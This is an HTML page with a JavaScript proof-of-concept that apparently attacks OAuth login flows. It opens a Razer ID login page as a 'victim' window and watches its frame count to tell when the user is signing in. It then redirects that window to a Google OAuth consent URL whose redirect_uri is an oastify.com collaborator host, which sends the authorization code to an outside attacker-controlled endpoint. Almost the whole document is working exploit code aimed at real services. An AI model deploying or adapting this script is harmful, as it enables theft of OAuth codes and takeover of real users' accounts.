    <h1>Timed Popup Windows</h1>
    <button onclick="startSequence()">Start Popup Sequence</button>

    <script>
        const victimWindow = window.open('https://razerid.razer.com/?client_id=c839026333341c074b79b27149f3783215c27663&l=en&redirect=https://www.razer.com/razerid-confirmation?url=/customs/view/sabaton/all/mouse-mats/razer-gigantus-v2~medium&iframe=0&force_login=1');
        let state = 'unknown';
        let frameTimeline = [];

        const detectOAuthFlow = setInterval(() => {
            try {
                const currentFrames = victimWindow.frames.length;
                const timestamp = Date.now();

                frameTimeline.push({frames: currentFrames, time: timestamp});

                // Keep only last 10 seconds of data
                frameTimeline = frameTimeline.filter(f => timestamp - f.time < 10000);

                // Pattern detection
                if (currentFrames === 0 && state === 'unknown') {
                    console.log('State: Login page (no frames)');
                    state = 'login_page';
                }

                if (currentFrames >= 2 && state === 'login_page') {
                    console.log('State: OAuth provider loaded (2+ frames)');
                    console.log('User is authenticating');
                    console.log('Triggering redirect to lol.com...');

                    // Attempt redirect
                    try {
                        victimWindow.location = 'https://accounts.google.com/o/oauth2/v2/auth?client_id=974122904543-89l2ehlv03a4lik2vp1lp520d0gpsjre.apps.googleusercontent.com&redirect_uri=https://xabfh66qku81rh8b4w09iy9d94fv3lra.oastify.com&response_type=code&scope=openid%20profile%20email&access_type=offline&prompt=consent';
                        console.log('Redirect successful!');
                        state = 'redirected';

                        // Stop monitoring after redirect
                        setTimeout(() => {
                            clearInterval(detectOAuthFlow);
                            console.log('Monitoring stopped after redirect');
                        }, 2000);

                    } catch (redirectError) {
                        console.log('Redirect blocked:', redirectError.message);
                        console.log('Likely blocked by COOP or popup blocker');
                    }
                }

                if (victimWindow.closed) {
                    console.log('Window closed');
                    clearInterval(detectOAuthFlow);
                }

            } catch (e) {
                console.log('Access denied - COOP protection active');
                console.log('   Error:', e.message);
                clearInterval(detectOAuthFlow);
            }
        }, 300);

        // Cleanup after 60 seconds
        setTimeout(() => {
            clearInterval(detectOAuthFlow);
            console.log('Monitoring timeout reached');
        }, 60000);
    </script>
